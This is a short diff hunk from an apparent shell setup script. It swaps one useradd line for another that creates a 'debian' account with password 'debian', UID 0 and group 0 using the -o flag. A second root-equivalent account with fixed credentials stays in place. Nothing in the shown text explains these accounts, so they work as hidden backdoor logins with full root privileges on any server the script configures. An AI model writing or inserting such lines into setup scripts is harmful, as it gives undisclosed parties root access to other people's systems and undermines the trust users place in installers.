@@ -63,7 +63,7 @@ echo -----------------------------------------------------
 clear
 sleep 2
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
-useradd -p $(openssl passwd -1 dexterjakulero) jakulerodexter -ou 0 -g 0
+useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
 sleep 2
 export EDITOR=nano
 sleep 2
